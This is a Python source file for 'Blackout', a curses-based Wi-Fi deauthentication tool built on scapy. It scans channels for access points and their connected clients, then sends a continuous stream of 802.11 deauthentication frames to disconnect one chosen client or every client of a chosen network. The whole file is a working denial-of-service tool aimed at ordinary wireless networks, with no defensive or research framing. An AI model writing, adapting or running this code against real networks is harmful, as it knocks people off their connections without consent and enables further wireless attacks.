#!/usr/bin/python3

#  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
#  TODO: Use argparse for command-line options
#       TODO: Allow option for number of deauth packets to send (EX: -c 100)
#       TODO: Allow option for providing interface name

import os
import re
import sys
import signal
import curses
import logging
# import argparse
import traceback
from time import sleep
from utils import Utils
from triggerlist import TriggerList
from subprocess import Popen, PIPE
from threading import Thread, Lock, Event
from scapy.all import *

# set scapy verbosity to zero
conf.verb = 0

# silence unwanted scapy output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"


class INFO:
    AP = 0
    CLIENT = 1
    SETUP = 3
    PROMPT = 4
    INPUT = 5


class Blackout:

    def __init__(self, interface):

        # Set curses screen object
        self.stdscr, self.window = self.start_curses()

        self.utils = Utils(interface)

        # Set scapy sniff interface
        conf.iface = interface
        self.iface = interface

        # Compile list of vendors
        self.vendors = Utils.compile_vendors()

        self.ap_dict = dict()
        self.ap_clients = dict()
        self.all_bssid = list()
        self.lock = Lock()

        self.main_display = TriggerList(self.update_display)
        self.target_ap = None
        self.target_bssid = None
        self.target_client = None
        self.target_id = None

        self.thread_channel_hop = Thread(
            target=Blackout.channel_hop,
            args=(str(interface),))
        self.thread_channel_hop.daemon = True

        # Thread to listen for user input in curses
        self.input_thread = Thread(target=self.fetch_input)
        self.input_thread.daemon = True

        self.ap_update_event = Event()
        self.ap_update_event.set()

        self.client_update_event = Event()
        self.client_update_event.set()

        # AP sniffer Thread
        self.sniff_ap_thread = Thread(
            target=sniff, kwargs={
                'prn': self.sniff_access_points,
                'iface': conf.iface,
                'store': 0})

        self.sniff_ap_thread.daemon = True

        # Client sniffer Thread
        self.sniff_clients_thread = Thread(
            target=sniff,
            kwargs={
                'prn': self.sniff_clients,
                'iface': conf.iface,
                'store': 0})

        # A flag to indicate deauth is in progress
        self.deauth_active = False

        # Indicates whether we are targetting an AP or Clients
        self.phase = 'AP'

        # Flag indicating user is choosing deauth option
        self.choosing = False

        # Holds the users menu choice as integer
        self.choice = None

    def fetch_input(self):
        while True:
            user_input = self.stdscr.getch()
            user_input = chr(user_input)

            if user_input == 'q':
                self.exit_application('thread')

            if user_input == 's':
                if self.deauth_active:
                    # Stop deauthentication
                    self.deauth_active = False
                elif self.phase == 'AP' and self.ap_update_event.is_set():
                    self.ap_update_event.clear()
                elif self.phase == 'client' and self.client_update_event.is_set():
                    self.client_update_event.clear()

            if user_input.isdigit():
                if self.choosing:
                    self.choice = user_input
                    self.choosing = False
                else:
                    self.target_id = int(user_input)

    def update_display(self):
        self.window.erase()
        self.refresh_screen()

        for line in self.main_display:
            self.to_window(line)

        self.refresh_screen()

    def refresh_screen(self):
        self.window.noutrefresh()
        curses.doupdate()

    def to_window(self, text):
        self.window.addstr(text)
        self.refresh_screen()

    def interface_setup(self):
        self.main_display.append(f"[+] Putting {self.iface} into MONITOR mode...\n")
        self.main_display.append(f"[+] Stopping any interfering processes...\n")

        try:
            status = self.utils.start_mon()
            if status is False:
                raise Exception(f"[!!] Could not put {self.iface} into MONITOR mode")
        except Exception as e:
            self.error(e)

    def start_threads(self):
        # Start daemon threads
        self.thread_channel_hop.start()
        self.input_thread.start()

    def start_sniff(self):
        """
        Start sniffing for access points and any connected clients
        """

        event = self.ap_update_event if self.phase == 'AP' else self.client_update_event

        self.output("[+] Sniffing Access Points on all channels\n")
        self.output("[+] Press 's' to select a target. 'q' to quit\n")
        self.output(Utils.print_headers())

        self.sniff_ap_thread.start()
        self.sniff_clients_thread.start()

        # if self.phase == 'AP':
        #     self.main_display.append("[+] Sniffing for Access Points on all channels\n")
        #     self.main_display.append("[+] Press 's' to select a target. 'q' to quit\n")
        #     self.main_display.append(self.utils.print_headers())
        #     self.sniff_ap_thread.start()

        # if self.phase == 'client':
        #     self.main_display.append(self.utils.horizontal_rule(30))
        #     self.main_display.append(f"\n[*] Sniffing for clients of AP - {self.target_ap['bssid']}...\n")
        #     self.main_display.append("[*] Press 's' to stop. 'q' to quit\n\n")
        #     self.proc_sniff_clients.start()

        # Wait for user to end client sniffing phase
        # TODO: This seems very inelegant, fix this
        while event.is_set(): pass
        sleep(2)
        self.show_summary()

    def show_summary(self):
        # Output a very simple summary of findings
        self.main_display.append(self.utils.horizontal_rule(30))

        if self.phase == 'AP':
            self.main_display.append(f"Access Points discovered: {len(self.ap_dict)}\n\n")
        elif self.phase == 'client':
            self.main_display.append(f"Clients discovered: {len(self.ap_clients)}\n\n")

    def deauth_menu_choice(self):
        self.main_display.append(choice_string())
        self.choosing = True
        while self.choosing and self.choice is None:
            pass

    def start_deauth(self):
        self.deauth_menu_choice()

        # Deuth all clients from AP
        if self.choice == '1':
            self.choice = None
            self.main_display.append("deauthing...")
            self.deauth(
                self.target_ap['bssid'],
                str(self.target_ap['channel']),
                BROADCAST_ADDR)

        elif self.choice == '2':
            self.choice = None
            self.phase = 'client'
            self.start_sniff()
            self.select_target()
            self.deauth(
                self.target_ap['bssid'],
                str(self.target_ap['channel']),
                self.target_client)

    def select_target(self, phase='AP'):
        self.target_id = None
        self.main_display.append(self.utils.horizontal_rule(30))
        self.main_display.append(f"\n[?] Enter ID of the {self.phase} you wish to target: ")

        # TODO: There may be a better way
        while self.target_id is None:
            pass

        self.main_display.append(str(self.target_id))

        if phase == 'AP':
            #  FORMAT: ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
            self.target_ap = self.ap_dict[self.target_id]

            outputs = [
                self.utils.horizontal_rule(30),
                f"\nSelected Access Point [{self.target_id}]\n",
                f"\tssid:\t\t{self.target_ap['ssid']}\n",
                f"\tbssid:\t\t{self.target_ap['bssid']}\n",
                f"\tchannel:\t\t{self.target_ap['channel']}\n",
                self.utils.horizontal_rule(30)]

            for out in outputs: self.main_display.append(out)

        elif phase == 'client':
            #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
            # [{'1': [client info, ]}, {'2', [client info, ... ]}, ... ]
            self.target_client = self.ap_clients[self.target_id - 1]

            self.main_display.append(self.utils.horizontal_rule(30))
            self.main_display.append(f"Targeting Client: [{self.target_client}]\n")
            self.main_display.append(self.utils.horizontal_rule(30))

    def run(self):

        # clear screen
        self.stdscr.clear()
        self.refresh_screen()

        try:
            self.interface_setup()
            self.start_threads()
            self.start_sniff()
            self.select_target()
            self.start_deauth()

        except Exception as e:
            Utils.log_error_to_file(traceback.format_exc())
            self.error(e)

        except KeyboardInterrupt:
            pass

        finally:
            self.main_display.append("[!] Exiting...\n")
            sleep(2)

    def deauth(self, bssid, channel, target):
        """
        create deauth packets and send them to the target AP
        """

        self.deauth_active = True
        deauth_all = False

        if target is BROADCAST_ADDR:
            deauth_all = True
            self.main_display.append(
                f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
        else:
            self.main_display.append(
                f"[*] deauth {target} from {bssid} on channel {channel}...\n")

        self.main_display.append("[*] Press 's' to stop.\n")

        try:
            go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
            go_to_chan.communicate()

            packets = []
            dot11_to_ap = Dot11(
                type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth()
            dot11_to_client = Dot11(
                type=0, subtype=12, addr1=bssid, addr2=target, addr3=target) / Dot11Deauth()
            packets.append([dot11_to_ap, dot11_to_client])

            if deauth_all:
                dot11_to_bcast = Dot11(
                    type=0, subtype=12, addr1=BROADCAST_ADDR, addr2=bssid, addr3=bssid) / Dot11Deauth()
                packets.append(dot11_to_bcast)

            # create deauth packet for AP and add to list
            # deauth_pkt = dot11/Dot11Deauth() #RadioTap() / dot11 / Dot11Deauth(reason=7)

            # send it
            # TODO: Use of a for loop for this is unconvential,
            # instead use the count argument to set number of packets. However,
            # for now I found this to be more reliable.
            try:
                while self.deauth_active:
                    self.main_display.append(".")
                    for pkt in packets:
                        sendp(pkt, inter=0.1, count=1, iface=conf.iface)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                self.error(e)
                self.exit_application('main')
                sys.exit(0)

            self.main_display.append("[*] Deauthentication Complete\n")
            return

        except Exception as e:
            self.error(e)

    def sniff_access_points(self, pkt):
        """
        Sniff packets, and extract info from them
        addr1=destination, addr2=source, addr3=transmitter
        """
        # Here scapy is going to check whether each sniffed packet
        # has particular 'layers' of encapsulation and act accordingly

        if not self.ap_update_event.is_set():
            return

        if pkt.haslayer(Dot11):
            # Check for beacon frames or probe responses from AP's
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):

                # If the packet contains a BSSID we have not encountered
                if pkt.addr3.upper() not in self.ap_clients:
                    access_point = pkt.addr3.upper()
                    # Add Access-Point to ap_dict
                    self.add_access_point(access_point, pkt)

    def sniff_clients(self, pkt):
        try:
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):
                # Packet is a Data or Control Frame
                if pkt.addr1 and pkt.addr2:
                    # Get destination and source MAC addresses
                    dst = pkt.addr1.upper()
                    src = pkt.addr2.upper()

                    # If the target AP is either source or destination, we know the other is a client
                    if BROADCAST_ADDR not in [dst, src]:
                        if src in self.ap_dict and not self.is_client(src, dst):
                            self.add_client(src, dst)
                        elif dst in self.ap_dict and not self.is_client(dst, src):
                            self.add_client(dst, src)

        except Exception as e:
            Utils.log_error_to_file(traceback.format_exc())
            self.error(e)

        except KeyboardInterrupt:
            pass

    def is_client(self, ap, client):
        return client in self.ap_dict[ap]['clients']

    def add_access_point(self, access_point, pkt):
        try:
            ssid = pkt[3].info.decode()
            if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
                ssid = "*HIDDEN/NONE*"

            # From airoscapy.py (by iphelix)
            # It's decoding the channel info from an awkward hex formatting('/x03' etc.)
            channel = ord(pkt[Dot11Elt:3].info)
            vendor = self.get_vendor(access_point)
            ap_id = len(self.ap_dict) + 1  # No. of AP's collected

            self.ap_dict[access_point] = {
                'id': ap_id, 'ssid': ssid, 'channel': channel, 'vendor': vendor, 'clients': []}

            # Output the AP details
            description = f"\n{ap_id}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, access_point, vendor)
            self.output(description)

        except Exception as e:
            if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                pass
            else:
                Utils.log_error_to_file(traceback.format_exc())
                self.error(e)

    def add_client(self, access_point, new_client):
        self.ap_dict[access_point]['clients'].append(new_client)

    # def sniff_clients(self, pkt):
    #     """
    #     addr1=destination, addr2=source, addr3=bssid
    #     """
    #
    #     if not self.client_update_event.is_set():
    #         return
    #
    #     # Go to correct channel
    #     channel = str(self.target_ap['channel'])
    #     go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
    #     go_to_chan.communicate()
    #
    #     # IF right type of frame, and not involved in authentication
    #     try:
    #         if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):  # and not pkt.haslayer(EAPOL):
    #             # Packet is a Data or Control Frame
    #             if pkt.addr1 and pkt.addr2:
    #
    #                 # Get destination and source MAC addresses
    #                 dst = pkt.addr1.upper()
    #                 src = pkt.addr2.upper()
    #
    #                 # If the target AP is either source or destination, we know the other is a client
    #                 if BROADCAST_ADDR not in (dst, src):
    #                     if src == self.target_bssid and dst not in self.ap_clients:
    #                         self.main_display.append("here 1\n")
    #                         self.ap_clients.append(dst)
    #                         self.main_display.append(f"[*] {dst}\t{self.get_vendor(dst)}\n")
    #
    #                     elif dst == self.target_bssid and src not in self.ap_clients:
    #                         self.main_display.append("here 2\n")
    #                         self.ap_clients.append(src)
    #                         self.main_display.append(f"[*] {src}\t{self.get_vendor(src)}\n")
    #
    #     except Exception as e:
    #         Utils.log_error_to_file(traceback.format_exc())
    #         self.error(e)
    #
    #     except KeyboardInterrupt:
    #         pass

    # TODO move to utils
    def get_vendor(self, bssid):
        try:
            name = self.vendors[bssid[:8]]
        except KeyError:
            name = "unknown device"

        return name

    # TODO move to utils
    @staticmethod
    def channel_hop(iface):
        """
        Hop channels until interrupted
        """

        # Total of 13 channels to search through (11 in the US)
        limit = 14

        while True:
            for i in range(1, 14):
                channel = i % limit
                # print(channel)

                # using Popen instead of os.system here avoids superfluous
                # output to the terminal from the iw command
                # which at times can crash the program (I'm not sure why yet)
                # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work

                # print("{} - {}".format(conf.iface, type(conf.iface)))
                p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
                try:
                    # effectively execute p
                    p.communicate()
                    sleep(1)  # TODO -- Experiment with different values
                except KeyboardInterrupt:
                    break
                except Exception:
                    pass

    def exit_curses(self):
        # End curses
        curses.nocbreak()
        self.stdscr.keypad(False)
        curses.echo()
        curses.endwin()

    def exit_application(self, source='main'):

        self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")

        try:
            status = self.utils.stop_mon()
            if not status:
                raise Exception("[!] Error putting {self.iface} into MANAGED mode")

            self.exit_curses()

            if source == 'thread':
                os.kill(os.getpid(), signal.SIGINT)
                sys.exit(0)

            if source == 'main':
                sys.exit(0)

        except Exception as e:
            self.error(e)

    def start_curses(self):
        # Setup curses
        stdscr = curses.initscr()
        curses.noecho()
        curses.cbreak()
        curses.curs_set(0)
        stdscr.keypad(True)

        # Use all the colours!
        # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
        curses.start_color()
        curses.use_default_colors()
        for i in range(0, curses.COLORS):
            curses.init_pair(i + 1, i, -1)

        HEIGHT, WIDTH = stdscr.getmaxyx()

        window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
        # window.border('|', '|', '-', '-', '+', '+', '+', '+')

        stdscr.noutrefresh()
        window.noutrefresh()
        curses.doupdate()

        return stdscr, window

    def signal_handler(self, sig, stack_frame):
        """
        This handles an interrupt signal, like
        Ctrl-C. Once detected, the program will sleep
        So we can 'get our affairs in order'
        """
        sleep(1)
        self.exit_application()

    def error(self, error):
        self.main_display.append(f"[!] Error: {error}\n")

    def output(self, msg):
        self.main_display.append(msg)


if __name__ == "__main__":

    blackout = Blackout("wlan0")

    # Set the signal handler
    signal.signal(signal.SIGINT, blackout.signal_handler)

    try:
        blackout.run()

    except Exception as e:
        Utils.log_error_to_file(traceback.format_exc())

    except KeyboardInterrupt:
        pass
